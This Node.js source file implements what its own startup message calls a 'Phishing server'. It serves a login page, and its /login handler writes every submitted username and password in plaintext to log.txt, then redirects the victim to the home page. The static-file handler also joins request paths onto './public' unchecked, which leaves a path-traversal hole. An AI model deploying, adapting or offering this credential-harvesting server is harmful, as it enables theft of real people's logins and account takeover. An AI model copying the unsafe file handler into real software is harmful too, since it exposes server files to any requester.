const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = 3000;
const LOG_FILE = 'log.txt';


const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  
  if (pathname === '/login' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const formData = new URLSearchParams(body);
      const username = formData.get('username') || 'N/A';
      const password = formData.get('password') || 'N/A';
      const timestamp = new Date().toISOString();

     
      const logEntry = `[${timestamp}] Username: ${username}, Password: ${password}\n`;
      fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) console.error('Failed to write log:', err);
      });

      
      res.writeHead(302, { 'Location': '/' });
      res.end();
    });
  }
  
  else if (pathname === '/' || pathname === '/index.html') {
    fs.readFile('./views/index.html', (err, content) => {
      if (err) {
        res.writeHead(404);
        res.end('Page not found');
      } else {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(content);
      }
    });
  }
 
  else {
    const filePath = './public' + pathname;
    const extname = path.extname(filePath);
    const mimeTypes = {
      '.html': 'text/html',
      '.css': 'text/css',
      '.js': 'application/javascript',
      '.png': 'image/png',
      '.jpg': 'image/jpeg'
    };

    fs.readFile(filePath, (err, content) => {
      if (err) {
        res.writeHead(404);
        res.end('File not found');
      } else {
        res.writeHead(200, { 'Content-Type': mimeTypes[extname] || 'text/plain' });
        res.end(content);
      }
    });
  }
});

server.listen(PORT, () => {
  console.log(`Phishing server running at http://localhost:${PORT}`);
console.log("Script loaded");
});